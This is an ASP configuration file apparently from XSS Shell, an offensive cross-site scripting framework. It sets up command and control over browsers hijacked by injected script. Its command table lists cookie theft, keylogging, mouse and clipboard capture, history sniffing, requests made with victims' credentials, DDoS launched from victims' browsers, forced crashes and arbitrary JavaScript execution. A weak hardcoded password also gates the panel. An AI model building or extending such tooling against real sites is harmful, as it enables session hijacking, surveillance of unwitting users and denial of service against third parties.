<%
'// By Ferruh Mavituna | http://ferruh.mavituna.com

' 09/08/2006
'	- Started
'
' 30/10/2006
'	- DBNAME changed with DBPATH
'
'31/10/2006
'	- Password protection added
'01.04.2007
'	- Password can be supplied by GET
Option Explicit

'60 minutes
Session.Timeout = 60

'Open In Live Enviroments
'On error resume next

'// DATABASE CONFIGURATION
Const DBPATH = "C:\XSS Shell\XSSShell-060\db\shell.mdb"


'Activity check time as seconds
Const Activity = "10"


Const SQLSERVER = False

Const XMLHTTP = 0
Const IFRAME = 1
Const IMG = 2
Const JSMODEL = 3

Dim COMMUNICATIONCHANNEL
COMMUNICATIONCHANNEL = JSMODEL

'Application Version
Const APPVER = "0.3.8"

'Default Records Count to show
Const DEFAULT_REC = 10
Const MAX_COMMAND = 5
Const MAX_VICTIM = 200

' Data Seperator
Const DATA_SEPERATOR = "|.|"

'Determine to accept every request or only valid Attack IDs (expected IDs)
Dim ACCEPT_EVERY_REQUEST 
ACCEPT_EVERY_REQUEST = False

'Broadcast attacks Always accept
Const BROADCAST_ATTACK = 336699

'// Constants for JS Connector implementation
Const HTMLPAGE = 1
Const TEXT = 2
Const COMMAND_SEPERATOR = "{|}"


Dim Commands

'var CMD_GETCOOKIE = 1;
'var CMD_GETSELFHTML = 2 ;
'var CMD_ALERT = 3;
'var CMD_YESNO = 4;
'var CMD_EVAL = 5;

' Avaliable Commands
Commands = Array("getCookie()",1,"Get victims active cookie", "getSelfHtml()",2,"Get victim's current page HTML Code", "alert(<message>)",3,"Send message to victim", "eval(<javascript code>)",5,"Execute virtually anything in JS","prompt(<question>)",4,"Play Truth or Dare","getKeyloggerData()",6,"Get keylogger data", "getMouseLog()", 7, "Get mouse log (every click in screen)", "getClipboard()", 8, "Get clipboard data (only IE)", "getInternalIP()", 9, "Get internal IP address (only Mozilla* + JVM)", "checkVisitedLinks(<url list>)",11,"Check victim's history (seperated by new line)", "getPage(<Relative URL Path>)",12,"Make a request with victim credentials", "DDoS(<url>)", 13, "Distributed Denial of Service attack (use {RANDOM} in URL to avoid caching)", "Crash()", 14, "Consume victim's CPU and force to crash/close.", "GetLocation()", 16, "Get current URL of victim.") 

'Hidden command STOPDOS = 15

'// Error Codes
Const NO_RECORD = 0
Const FAILED = 0
Const SUCCESS = 1
Const NON_ERROR = 2

'Global
Dim Title

'// DB Connection
Dim fmconn, fmconnexe, fmconnpath
fmconnpath = DBPATH 
'Response.Write fmconnpath : Response.End

If SQLSERVER Then
	fmconn = "Provider=sqloledb;" & _
			   "Data Source=" & SQLIP & ";" & _
			   "Initial Catalog=***;" & _
				"User ID=***;" & _
				"Password=***"
	fmconnexe = fmconn

Else '// Access
	fmconn = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & fmconnpath
	fmconnexe = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & fmconnpath

End If


'// Password protected pages
Sub protected()

	'XSS Shell Proxy Check 
	If fm_Qnstr("XSSSHELLPROXY") > 0 Then
		Response.Write 13
		Response.End
	End If

	Dim ThisPage
	ThisPage = Server.HtmlEncode(Request.ServerVariables("SCRIPT_NAME"))

	Dim Pass
	Pass = Request.Form("pass")
	If Len(Pass) = 0 Then Pass = Request.Querystring("pass")

	'// Set Session + password is Case Sensitive
	If Pass <> "" Then
		If Trim(Pass) = "w00t" Then Session("level") = "ok"
		'Response.Redirect ""
	End If

	'// Logout (xxx.asp?logout=ok)
	If Request.Querystring("logout") <> "" Then Session("level") = ""

	'// Ask for Login
	If Session("level") <> "ok" Then
		Response.Write "<form method=""post"" action=""" & ThisPage & """><input type=""password"" name=""pass"" /><input type=""submit"" value=""Login""/></form>"
		Response.End
	End If

End Sub

'// Include Library
%>
<!--#include file="fmlibrary/fmlibraryv3.asp" -->